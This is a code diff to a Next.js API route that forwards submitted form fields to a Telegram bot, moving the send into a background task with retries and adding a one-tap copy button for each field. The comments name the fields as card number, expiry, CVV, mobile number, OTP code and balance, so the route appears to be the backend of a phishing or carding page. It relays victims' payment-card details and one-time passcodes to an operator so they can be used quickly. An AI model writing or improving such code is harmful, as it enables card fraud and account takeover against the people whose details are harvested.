@@ -1,4 +1,14 @@
-import { NextResponse } from 'next/server'
+import { NextResponse, after } from 'next/server'
+import { buildCopyKeyboard, sendTelegramMessage } from '@/lib/telegram-server'
+
+// Fields whose value is just context (which bank) rather than a detail an
+// admin would want a one-tap "copy" button for.
+const NO_COPY_BUTTON_LABELS = new Set(['Bank'])
+
+// Telegram's API can occasionally be slow to respond. Sending happens in
+// after() so this route always responds quickly to the client instead of
+// risking a platform request timeout while waiting on Telegram.
+export const maxDuration = 60
 
 type Field = { label: string; value: string }
 
@@ -42,20 +52,20 @@ export async function POST(request: Request) {
       .join('\n')
     const text = `<b>${escapeHtml(title)}</b>\n${lines}`
 
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: 'HTML',
-      }),
-      cache: 'no-store',
-    })
+    // One-tap "copy" button per sensitive field, e.g. Card Number, Expiry,
+    // CVV, Mobile, OTP Code, Balance — matches the checkmark + copy-icon
+    // buttons Telegram renders for copy_text inline keyboard buttons.
+    const copyButtons = fields
+      .filter((f) => !NO_COPY_BUTTON_LABELS.has(f.label))
+      .map((f) => ({ text: `✅ Copy ${f.label}`, value: f.value }))
+    const replyMarkup = copyButtons.length > 0 ? buildCopyKeyboard(copyButtons) : undefined
 
-    if (!telegramResponse.ok) {
-      return NextResponse.json({ error: 'Telegram notification failed' }, { status: 502 })
-    }
+    after(async () => {
+      const sent = await sendTelegramMessage(token, chatId, text, 'HTML', replyMarkup)
+      if (!sent) {
+        console.log('[v0] Telegram notify: failed after all retries')
+      }
+    })
 
     return NextResponse.json({ ok: true })
   } catch {
